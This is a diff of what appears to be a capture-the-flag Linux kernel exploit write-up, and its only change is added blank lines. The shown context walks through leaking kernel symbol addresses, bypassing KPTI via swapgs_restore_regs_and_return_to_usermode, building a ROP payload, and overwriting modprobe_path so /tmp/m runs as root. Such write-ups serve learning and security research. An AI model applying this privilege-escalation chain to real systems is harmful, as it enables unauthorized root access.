@@ -305,6 +305,7 @@ Now let's grep the interesting symbols...
     ffffffffa2c61820 D modprobe_path
     / # cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
     ffffffffa1e00f10 T swapgs_restore_regs_and_return_to_usermode
+
 The last one is the function we will use to bypass kpti...
 Those addresses are also randomized, so we need to leak kernel base and subtract it from those addresses to get their offsets...
 
@@ -376,6 +377,7 @@ We will update it in:
     payload[off++] = mov_rbx_rax;
     payload[off++] = 0x0; // pop rbx
     payload[off++] = 0x0; // pop rbp
+
 So far we have overwritten modprobe_path to /tmp/m, but what is /tmp/m?
 /tmp/m will be our malicious payload to become root, when we return to userland, in this case we will read the flag stored in /dev/sda.
 Then we create /tmp/dummy that contains 4 \xff bytes for the header, when executed the kernel will call modprobe_path, but in reality it will execute /tmp/m because we overwrote it. Translating it in c:
